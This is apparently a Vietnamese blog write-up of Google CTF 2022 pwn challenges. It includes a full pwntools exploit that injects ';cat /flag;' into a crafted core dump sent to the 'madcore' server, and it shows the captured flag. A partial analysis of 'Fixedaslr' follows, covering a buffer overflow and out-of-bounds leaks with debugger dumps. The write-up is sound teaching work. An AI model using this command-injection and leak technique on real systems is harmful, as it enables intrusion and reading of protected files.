</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;backtrace&#34;</span>:<span style="color:#f92672">[[</span>0,<span style="color:#e6db74">&#34;&lt;unknown&gt;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>45524,<span style="color:#e6db74">&#34;/bin /boot /dev /etc /flag /home /lib /lib32 /lib64 /libx32 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var\n&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>993956,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>501318,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>505870,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>107638,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>2035,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]]</span>,<span style="color:#e6db74">&#34;modules&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/home/pi/CTF/google_ctf/test&#34;</span>,<span style="color:#e6db74">&#34;/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style="color:#e6db74">&#34;;echo /*;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span><span style="color:#f92672">]}[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span>$ 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to madcore.2022.ctfcompetition.com port <span style="color:#ae81ff">1337</span>
</span></span></code></pre></div><p>Vậy là mình có thể chắc chắn rằng command injection vẫn hoạt động trên server, giờ chỉ việc thay command thành <code>cat /flag</code> thôi.</p>
<h2 id="final-script">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./madcore&#39;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;madcore.2022.ctfcompetition.com&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>to_replace <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;cat /flag;&#39;</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> cmd<span style="color:#f92672">.</span>ljust(len(to_replace), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./coredump/core_test_6040&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    core_dump <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    core_patched <span style="color:#f92672">=</span> core_dump<span style="color:#f92672">.</span>replace(to_replace, cmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> core_patched
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x1000000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FINISHED READING.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ python3 solve.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;backtrace&#34;</span>:<span style="color:#f92672">[[</span>0,<span style="color:#e6db74">&#34;&lt;unknown&gt;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>45524,<span style="color:#e6db74">&#34;CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}\n&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>993956,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>501318,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>505870,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>107638,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>2035,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]]</span>,<span style="color:#e6db74">&#34;modules&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/home/pi/CTF/google_ctf/test&#34;</span>,<span style="color:#e6db74">&#34;/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style="color:#e6db74">&#34;;cat /flag;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span><span style="color:#f92672">]}[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span>$ 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to madcore.2022.ctfcompetition.com port <span style="color:#ae81ff">1337</span>
</span></span></code></pre></div><h1 id="fixedaslr">Fixedaslr:<a hidden class="anchor" aria-hidden="true" href="#fixedaslr">#</a></h1>
<ul>
<li>Category: pwn</li>
<li>Points: 240</li>
<li>Solves: 35</li>
<li>Description: I wasn&rsquo;t happy with the default ASLR, so I fixed it. The flag is in a file called &ldquo;flag&rdquo; both in / and cwd.</li>
</ul>
<p>Đầu tiên thì mình xin gửi lời cảm ơn tới 1 người đồng đội đã cùng mình giải bài này, đặc biệt là phần crypto. Kudos to you mate!</p>
<h2 id="overview-1">Overview<a hidden class="anchor" aria-hidden="true" href="#overview-1">#</a></h2>
<p>Đề cho 7 object file và 1 file binary <code>loader</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf/fixedaslr $ ls
</span></span><span style="display:flex;"><span>basic.o  debug.o  game.o  guard.o  loader  main.o  res.o  syscalls.o
</span></span></code></pre></div><p>Vẫn là những điều quen thuộc &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf/fixedaslr $ file loader 
</span></span><span style="display:flex;"><span>loader: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, statically linked, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>71086f1a8e8132c20313b70de229555e4f551144, not stripped
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf/fixedaslr $ checksec loader
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/pi/CTF/google_ctf/fixedaslr/loader&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>IDA
<img loading="lazy" src="/posts/googlectf2022/img7.png" alt="img"  />
</p>
<p>Đầu tiên chương trình gọi hàm <code>sys_getrandom()</code> để tạo 1 giá trị random cho <code>rand_state</code>.
<img loading="lazy" src="/posts/googlectf2022/img8.png" alt="img"  />
</p>
<p>Sau đó gọi <code>rand(64)</code> để khởi tạo giá trị cho <code>canary</code>.
<img loading="lazy" src="/posts/googlectf2022/img9.png" alt="img"  />
</p>
<p>Tiếp theo load các object file vào memory.
<img loading="lazy" src="/posts/googlectf2022/img10.png" alt="img"  />
</p>
<p>Base address của các object file được tạo random bằng cách gọi <code>rand(12) &lt;&lt; 28</code>.
<img loading="lazy" src="/posts/googlectf2022/img11.png" alt="img"  />
</p>
<p>Cuối cùng thì gọi hàm <code>pivot_to_main</code>
<img loading="lazy" src="/posts/googlectf2022/img12.png" alt="img"  />
</p>
<p>để munmap địa chỉ 0x400000 (địa chỉ base address của file loader)
<img loading="lazy" src="/posts/googlectf2022/img13.png" alt="img"  />
</p>
<p>và bắt đầu gọi tới file main.o.
<img loading="lazy" src="/posts/googlectf2022/img14.png" alt="img"  />
</p>
<p>Chúng ta sẽ chỉ tập trung vào hàm <code>menu()</code>. Hàm này thì nằm trong <code>game.o</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">menu</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v2[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-=*) MAIN MENU:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">  1) Play The Game</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">  2) See full scoreboard</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">  3) See score for place</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">  4) Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Your choice?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)readline(v2, <span style="color:#ae81ff">32LL</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)atou64(v2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)v1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Alright, bye&#34;</span>);
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        see_scoreboard();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          game();
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          see_full_scoreboard();
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Come again?&#34;</span>);
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Hàm <code>game()</code> random 2 số rồi cộng lại. Nếu trả lời đúng thì sẽ +5 điểm.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">game</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> v1; <span style="color:#75715e">// [rsp+Ch] [rbp-64h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> v2; <span style="color:#75715e">// [rsp+Dh] [rbp-63h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+10h] [rbp-60h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+18h] [rbp-58h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-50h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v6[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+40h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp+68h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Have Fun, Good Luck!&#34;</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>; ; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Round &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(s, i);
</span></span><span style="display:flex;"><span>    puts(s);
</span></span><span style="display:flex;"><span>    v1 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xAu</span>;
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xAu</span>;
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;How much is &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(s, v1);
</span></span><span style="display:flex;"><span>    print(s);
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34; + &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(s, v2);
</span></span><span style="display:flex;"><span>    print(s);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34; ?&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)readline(v6, <span style="color:#ae81ff">32LL</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">+</span> v2 <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)atou64(v6) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Wrong! Game Over!&#34;</span>);
</span></span><span style="display:flex;"><span>      check_scoreboard(v3);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> v7 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">5LL</span>;
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Yes! +5pts! You have &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(s, v3);
</span></span><span style="display:flex;"><span>    print(s);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;pts total.&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v7 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhập sai thì sẽ in ra dòng <code>Wrong! Game Over!</code> và kiểm tra xem số điểm cuối cùng có thể vào được scoreboard không.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">check_scoreboard</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> score)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">9</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( score <span style="color:#f92672">&gt;</span> game_scoreboard[i] )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      shift_scoreboard(i);
</span></span><span style="display:flex;"><span>      get_player_name(i);
</span></span><span style="display:flex;"><span>      game_scoreboard[i] <span style="color:#f92672">=</span> score;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> v3 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nếu được thì sẽ shift scoreboard và gọi hàm <code>get_player_name()</code> để nhập vào tên của player.</p>
<p>Hàm <code>see_scoreboard()</code> cho phép xem số điểm cần thiết để đạt được thứ hạng đó. Còn hàm <code>see_full_scoreboard()</code> thì dùng để xem full scoreboard.</p>
<h2 id="finding-the-bug-1">Finding the bug<a hidden class="anchor" aria-hidden="true" href="#finding-the-bug-1">#</a></h2>
<p>Giờ thì chúng ta cũng đã hiểu sơ qua cách chương trình hoạt động. Tới lúc tìm bug rồi.</p>
<p>Bug đầu tiên nằm ở hàm <code>get_player_name()</code>.
<img loading="lazy" src="/posts/googlectf2022/img15.png" alt="img"  />
</p>
<p>Để ý nếu <code>nbytes &gt; 31</code> thì mặc dù chương trình in ra dòng <code>Name too long! No SCOREBOARD for you.</code> nhưng vẫn cho phép read vào buffer =&gt; lỗi buffer overflow.</p>
<p>Bug thứ hai thì ở trong hàm <code>see_scoreboard()</code>.
<img loading="lazy" src="/posts/googlectf2022/img16.png" alt="img"  />
</p>
<p>Không có đoạn check nào kiểm tra <code>v1</code> =&gt; out-of-bounds.</p>
<p>Với lỗi <code>bof</code> thì mình có thể hoàn toàn build 1 cái ropchain, nhưng để làm được điều đó thì mình cần phải bypass được canary. Vậy làm cách nào để bypass được? Hmm, chúng ta vẫn còn lỗi <code>oob</code> chưa sử dụng, vậy trong trường hợp này, mình có thể làm được gì với <code>oob</code>?</p>
<h2 id="oob">Oob<a hidden class="anchor" aria-hidden="true" href="#oob">#</a></h2>
<p>Dưới đây là các giá trị trong mảng <code>game_scoreboard</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  telescope 0x0000f2b0002000
</span></span><span style="display:flex;"><span>0x0000f2b0002000│+0x0000: 0x0000000000005f <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_&#34;</span>?<span style="color:#f92672">)</span>	 ← $rdx
</span></span><span style="display:flex;"><span>0x0000f2b0002008│+0x0008: 0x0000000000005a <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Z&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002010│+0x0010: 0x00000000000055 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;U&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002018│+0x0018: 0x00000000000050 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;P&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002020│+0x0020: 0x0000000000004b <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;K&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002028│+0x0028: 0x00000000000046 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;F&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002030│+0x0030: 0x00000000000041 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;A&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002038│+0x0038: 0x0000000000003c <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002040│+0x0040: 0x00000000000037 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;7&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0002048│+0x0048: 0x00000000000032 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;2&#34;</span>?<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Ta thấy ở offset <code>512</code> chứa 1 địa chỉ.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  telescope 0x0000f2b0002000+512*8
</span></span><span style="display:flex;"><span>0x0000f2b0003000│+0x0000: 0x0000f2b0002060  →  0x00000079726147 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Gary&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x0000f2b0003008│+0x0008: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003010│+0x0010: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003018│+0x0018: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003020│+0x0020: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003028│+0x0028: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003030│+0x0030: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003038│+0x0038: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003040│+0x0040: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0003048│+0x0048: 0x0000000000000000
</span></span></code></pre></div><p>Địa chỉ này nằm trong vùng <code>main.o</code> nên mình có thể leak được base address của <code>main.o</code>. Tương tự như vậy, ở offset <code>-1023</code> và <code>-1017</code> có thể leak thêm base address của 2 file object nữa là <code>game.o</code> và <code>guard.o</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  telescope 0x0000f2b0002000-1023*8
</span></span><span style="display:flex;"><span>0x0000f2b0000008│+0x0000: 0x00009580001111  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x0000f2b0000010│+0x0008: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x0000f2b0000018│+0x0010: 0x0000958000175c  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x0000f2b0000020│+0x0018: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x0000f2b0000028│+0x0020: 0x00009580001000  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x0000f2b0000030│+0x0028: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x0000f2b0000038│+0x0030: 0x00004080001000  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x0000f2b0000040│+0x0038: 0x0000000000000000
